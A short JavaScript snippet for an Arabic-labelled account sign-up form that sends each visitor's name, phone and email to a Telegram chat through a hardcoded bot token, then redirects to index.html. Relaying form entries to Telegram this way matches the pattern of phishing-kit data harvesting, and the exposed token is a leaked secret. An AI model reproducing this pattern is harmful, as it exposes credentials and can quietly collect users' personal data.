
document.getElementById("loginot2").addEventListener("click", function() {
    window.location.href = "index.html"; 
  });
    const TOKEN = '8175263332:AAEIUzNpEc-JTAKnCChRiImCmQtsAFLaxvI'; 
    const CHAT_ID = '7595871538'; 
  
    document.querySelector("form").addEventListener("submit", function(e) {
      e.preventDefault(); 
  
      const name = this.name.value;
      const phone = this.phone.value;
      const email = this.email.value;
  
      const message = `
  📥    انشاء حساب جديد :
  👤 الاسم: ${name}
  📞 الهاتف: ${phone}
  📧 البريد الإلكتروني: ${email}
      `;
  
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }).then(response => {
        if (response.ok) {
          window.location.href = "index.html"; 
        } else {
        }
      });
    });